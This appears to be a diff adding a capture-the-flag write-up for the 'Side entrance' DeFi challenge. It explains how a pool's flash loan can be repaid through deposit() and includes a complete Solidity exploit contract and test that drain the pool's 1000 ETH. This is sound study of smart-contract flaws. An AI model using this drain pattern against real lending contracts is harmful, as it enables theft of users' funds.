@@ -225,3 +225,53 @@ This means, that we can call any function we want from flashLoan function. So if
         Drainer drainer = new Drainer(token, pool, recovery);
     }
 
+
+## Side enterance
+
+### Challenge overview
+
+A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
+It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
+You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
+
+### Vulnerability Analysis
+
+In flashLoan() function we can see, that we have an opportunity to call our implementation of execute() function. 
+The function checks if we refund the ETH to contract, but it doesn't control the way we do that. The root issue is that the contract doesn't distinguish between "repayment of a loan" and "making a deposit" - they both increase the contract's ETH balance, but have very different accounting implications. So we can simply refund the ETH to loaning contract buy depositing into it. The contract will get the funds back and pass the checking, but in contract's accountng the ETH will belong to exploiter contract.
+
+### Solution
+
+    contract MyIFlashLoanEtherReceiver {
+        SideEntranceLenderPool pool;
+        address payable recovery;
+        
+        constructor(address _pool, address payable _recovery) {
+            recovery = _recovery;
+            pool = SideEntranceLenderPool(_pool);
+        }
+
+        function callFlashLoan(uint256 amount) external {
+            pool.flashLoan(amount);
+        }
+
+        function execute() external payable {
+            pool.deposit{value: msg.value}();
+        }
+
+        function withdraw() public {
+            pool.withdraw();
+            (bool success, ) = recovery.call{value: address(this).balance}("");
+        }
+
+        receive() external payable {}
+
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_sideEntrance() public checkSolvedByPlayer {
+        MyIFlashLoanEtherReceiver loanReceiver = new MyIFlashLoanEtherReceiver(address(pool), payable(recovery));
+        loanReceiver.callFlashLoan(ETHER_IN_POOL);
+        loanReceiver.withdraw();
+    }
